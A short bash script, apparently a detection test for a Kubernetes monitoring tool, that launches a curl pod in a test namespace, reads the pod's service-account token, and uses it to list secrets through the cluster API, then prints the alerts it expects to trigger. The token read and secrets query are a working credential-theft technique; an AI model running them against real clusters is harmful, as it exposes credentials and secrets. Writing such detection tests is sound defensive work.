#!/usr/bin/env bash
# T1552.007 SA token theft + API recon (NW-004/005/013/015).
set -euo pipefail
NS=${NS:-nightwatch-test}
kubectl -n "$NS" run token-demo --restart=Never --image=curlimages/curl --command -- sleep 300
kubectl -n "$NS" wait --for=condition=Ready pod/token-demo --timeout=60s
kubectl -n "$NS" exec token-demo -- sh -c '
  T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);
  curl -sk -H "Authorization: Bearer $T" https://kubernetes.default/api/v1/namespaces/default/secrets || true'
echo "[+] expect NW-004 WARNING (token read by curl) + NW-005 (API egress)"
